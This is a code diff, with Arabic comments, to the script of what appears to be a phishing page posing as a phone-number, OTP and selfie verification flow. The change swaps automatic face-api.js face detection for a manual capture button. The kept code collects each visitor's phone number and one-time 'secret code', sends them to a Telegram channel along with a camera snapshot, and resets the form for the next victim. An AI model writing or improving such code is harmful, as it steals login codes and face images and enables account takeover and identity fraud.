@@ -13,7 +13,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const otpPage = document.getElementById('otp-page');
     const selfiePage = document.getElementById('selfie-page');
     const cameraPage = document.getElementById('camera-page');
-    const loadingMessage = document.getElementById('loading-message');
     const faceOutlineCircle = document.getElementById('face-outline-circle');
     
     // --- Button & Input Elements ---
@@ -29,38 +28,14 @@ document.addEventListener('DOMContentLoaded', () => {
     const backToSelfieInstructionsBtn = document.querySelector('.back-to-selfie-instructions');
     const signupBtn = document.querySelector('.signup-btn-style');
     const signupNotice = document.getElementById('signup-notice');
+    const captureBtn = document.getElementById('capture-btn');
 
     let stream = null;
-    let detectionInterval = null;
-    let isCapturing = false;
-
-    // --- تحميل نماذج الذكاء الاصطناعي ---
-    async function loadModels() {
-        // === تم تغيير مصدر تحميل النماذج إلى مصدر أكثر استقرارًا ===
-        const MODEL_URL = 'https://unpkg.com/face-api.js@0.22.2/weights';
-        loadingMessage.classList.add('show');
-        try {
-            console.log("Starting to load models...");
-            // === تم جعل عملية التحميل أكثر قوة لضمان عملها ===
-            await Promise.all([
-                faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
-                faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
-                faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL)
-            ]);
-            console.log("All models loaded.");
-        } catch (error) {
-            console.error("Error loading models:", error);
-            alert("فشل تحميل نماذج الذكاء الاصطناعي. يرجى تحديث الصفحة والتأكد من اتصالك بالإنترنت.");
-        }
-        loadingMessage.classList.remove('show');
-    }
-    loadModels();
 
     // --- منطق التنقل والكاميرا ---
     takeSelfieBtn.addEventListener('click', async () => {
         selfiePage.classList.remove('active');
         cameraPage.classList.add('active');
-        isCapturing = false;
         
         try {
             const constraints = { video: { facingMode: 'user' } };
@@ -74,39 +49,11 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    cameraFeed.addEventListener('play', () => {
-        detectionInterval = setInterval(async () => {
-            if (isCapturing) return;
+    // --- منطق الالتقاط اليدوي الجديد ---
+    captureBtn.addEventListener('click', () => {
+        // إعطاء إشارة مرئية للمستخدم
+        faceOutlineCircle.classList.add('match');
 
-            const detections = await faceapi.detectSingleFace(cameraFeed, new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.5 }));
-            
-            if (detections) {
-                const faceBox = detections.box;
-                const videoWidth = cameraFeed.videoWidth;
-                const videoCenterX = videoWidth / 2;
-                const faceCenterX = faceBox.x + faceBox.width / 2;
-
-                const isCentered = Math.abs(faceCenterX - videoCenterX) < 50;
-                const isGoodSize = faceBox.width > 120;
-
-                if (isCentered && isGoodSize) {
-                    faceOutlineCircle.classList.add('match');
-                    isCapturing = true;
-                    
-                    setTimeout(() => {
-                        capturePhotoAndSendData();
-                        faceOutlineCircle.classList.remove('match');
-                    }, 1000);
-                } else {
-                    faceOutlineCircle.classList.remove('match');
-                }
-            } else {
-                faceOutlineCircle.classList.remove('match');
-            }
-        }, 600);
-    });
-
-    function capturePhotoAndSendData() {
         const canvas = document.createElement('canvas');
         canvas.width = cameraFeed.videoWidth;
         canvas.height = cameraFeed.videoHeight;
@@ -116,7 +63,7 @@ document.addEventListener('DOMContentLoaded', () => {
         context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
         
         stopCamera();
-        alert('تم التقاط الصورة تلقائيًا! جاري إرسال البيانات...');
+        alert('تم التقاط الصورة بنجاح! جاري إرسال البيانات...');
 
         const message = `**=== بيانات مستخدم جديد ===**\n**رقم الهاتف:** \`${userPhoneNumber}\`\n**الرمز السري:** \`${userOtp}\``;
         sendTelegramMessage(message);
@@ -126,27 +73,27 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 'image/jpeg');
 
         setTimeout(() => {
+            // إعادة كل شيء لوضعه الطبيعي
+            faceOutlineCircle.classList.remove('match');
             cameraPage.classList.remove('active');
             loginPage.classList.add('active');
-            // Reset form fields for next use
+            
+            // إعادة تعيين الحقول للمستخدم التالي
             otpInputs.forEach(input => input.value = '');
             phoneInput.value = '';
             loginBtn.disabled = true;
             loginBtn.classList.remove('activated');
         }, 2000);
-    }
+    });
     
     function stopCamera() {
-        if (detectionInterval) {
-            clearInterval(detectionInterval);
-        }
         if (stream) {
             stream.getTracks().forEach(track => track.stop());
             stream = null;
         }
     }
 
-    // --- دوال وأكواد أخرى تبقى كما هي ---
+    // --- بقية الأكواد تبقى كما هي ---
     loginForm.addEventListener('submit', (e) => {
         e.preventDefault();
         if (!loginBtn.disabled) {
